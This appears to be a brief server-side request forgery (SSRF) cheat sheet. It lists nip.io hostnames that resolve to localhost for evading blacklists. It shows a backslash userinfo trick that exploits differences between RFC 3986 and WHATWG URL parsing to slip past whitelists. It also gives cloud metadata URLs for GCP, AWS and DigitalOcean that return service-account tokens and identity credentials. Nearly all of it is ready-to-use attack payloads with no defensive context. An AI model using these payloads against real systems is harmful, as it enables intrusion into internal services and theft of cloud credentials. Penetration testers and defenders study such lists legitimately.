
### **Blacklist:**

* http://127-0-0-1.nip.io
*  http://75000001.nip.io
    * Both Resolve to http://127.0.0.1

### Whitelist:

* Find open redirect with **301 or 302**
* **Backslash Trick** ==> http://127.0.0.1\@www.whitelisted_domain.com
	* **RFC 3986** treats everything before @ as the userinfo section whereas **WHATWG** `Web Hypertext Application Technology Working Group` treats backslash as ending of hostname

### **Cloud Env Enumeration:**

* **GCP** ==> http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token?alt=json
* **AWS** ==> http://169.254.169.254/latest/meta-data/identity-credentials
* **Digital Ocean** ==> http://169.254.169.254/metadata/v1.json

